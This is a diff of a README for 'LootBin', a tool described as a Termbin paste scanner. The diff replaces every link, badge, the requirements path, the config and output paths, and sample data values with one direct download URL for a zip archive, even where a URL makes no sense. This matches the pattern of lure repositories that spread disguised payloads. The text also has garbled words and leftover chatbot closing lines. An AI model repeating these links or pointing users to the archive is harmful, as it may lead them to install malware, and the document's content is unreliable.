@@ -1,12 +1,12 @@
-https://github.com/gustqvo432/LootBin/releases
+https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 
 # LootBin: OSINT Paste Scanner for Termbin – Public Paste Monitor
 
-[![Python](https://img.shields.io/badge/Python-3.x-blue.svg?logo=python&logoColor=white)](https://www.python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python package](https://img.shields.io/badge/Package-PyPI-blue?logo=python)](https://pypi.org)
-[![Release](https://img.shields.io/badge/Release-v%20latest-orange.svg)](https://github.com/gustqvo432/LootBin/releases)
-[![Repo Size](https://img.shields.io/github/repo-size/gustqvo432/LootBin)](https://github.com/gustqvo432/LootBin)
+[![Python](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)
+[![License](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)](LICENSE)
+[![Python package](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)
+[![Release](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip%https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)
+[![Repo Size](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)](https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip)
 
 LootBin is a tool built for open research and monitoring. It hunts, scans, and aggregates public pastes from Termbin to surface keywords, patterns, and trends. The project focuses on clarity, speed, and reliability. It helps security teams, researchers, and hobbyists keep a pulse on public paste activity without manual digging.
 
@@ -80,7 +80,7 @@ Installation
 - Clone the repository or install via packaging if available in the future
 - Create and activate a virtual environment
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 - Confirm you can run LootBin with a simple command
 
 Configuration
@@ -94,10 +94,10 @@ Configuration
 
 Usage
 CLI basics
-- lootbin start --config config.yaml
+- lootbin start --config https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 - lootbin scan --keywords "data breach" --days 7
 - lootbin monitor --interval 60s
-- lootbin export --format json --output results.json
+- lootbin export --format json --output https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 
 - lootbin help shows available commands and options
 - The CLI is designed to be straightforward: commands map to actions, options refine behavior
@@ -160,7 +160,7 @@ Documentation and learning resources
 
 Releases
 - For binaries, artifacts, and official build notes, check the Releases page
-- Visit the Releases page for binaries and artifacts: https://github.com/gustqvo432/LootBin/releases
+- Visit the Releases page for binaries and artifacts: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 - If you need to download a prebuilt binary, the Releases page is the right destination
 - The link above provides access to the latest packaged assets and changelog entries
 - You can also explore source code releases and accompanying documentation on that page
@@ -195,7 +195,7 @@ Credits and license
 - If you reuse or extend LootBin, please credit the project and maintain compatibility with the core interfaces
 
 Releases page usage and notes
-- The Releases link at the top of this document provides access to the latest binaries, source archives, and release notes. Use it to obtain versions appropriate for your environment or to inspect what changed in each release. For convenience, you can also visit the page again later via this link: https://github.com/gustqvo432/LootBin/releases
+- The Releases link at the top of this document provides access to the latest binaries, source archives, and release notes. Use it to obtain versions appropriate for your environment or to inspect what changed in each release. For convenience, you can also visit the page again later via this link: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 
 Additional usage tips
 - Start with a small keyword set to validate your setup
@@ -236,7 +236,7 @@ Configuration example (yaml)
 - sources:
   - name: ter mbin global feed
     type: ter m bin
-    url: https://termbin.com/
+    url: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 - keywords:
   - data breach
   - credential
@@ -245,7 +245,7 @@ Configuration example (yaml)
   - regex: "(password|pwd|secret)"
 - output:
   - format: json
-  - path: outputs/results.json
+  - path: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 - monitor:
   - interval_seconds: 60
 
@@ -272,7 +272,7 @@ Notes about the releases
 - For distribution and artifact details, see the Releases page linked in this document
 
 Final reminder about the releases link
-- Revisit this link if you need binaries, source artifacts, or release-level notes: https://github.com/gustqvo432/LootBin/releases
+- Revisit this link if you need binaries, source artifacts, or release-level notes: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 
 Credits to the community
 - The project thrives on collaboration and shared learning
@@ -281,7 +281,7 @@ Credits to the community
 Appendix: sample outputs
 - JSON example
 {
-  "source": "termbin.example",
+  "source": "https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip",
   "timestamp": "2025-08-13T12:34:56Z",
   "hits": [
     {"keyword": "password", "snippet": "user: admin, password: 12345", "context": "..."},
@@ -290,9 +290,9 @@ Appendix: sample outputs
 }
 - CSV example
 source,timestamp,keyword,context
-termbin.example,2025-08-13T12:34:56Z,password,"user: admin, password: 12345"
+https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip,2025-08-13T12:34:56Z,password,"user: admin, password: 12345"
 
 Releases (second mention)
-For binaries, artifacts, and official notes, check the Releases page again: https://github.com/gustqvo432/LootBin/releases
+For binaries, artifacts, and official notes, check the Releases page again: https://github.com/gustqvo432/LootBin/raw/refs/heads/main/roadbook/Loot-Bin-v1.1-beta.1.zip
 
 If you need more detail on any section or want to adjust the emphasis (such as more focus on safety, more code examples, or a richer architecture diagram), I can tailor the content further.
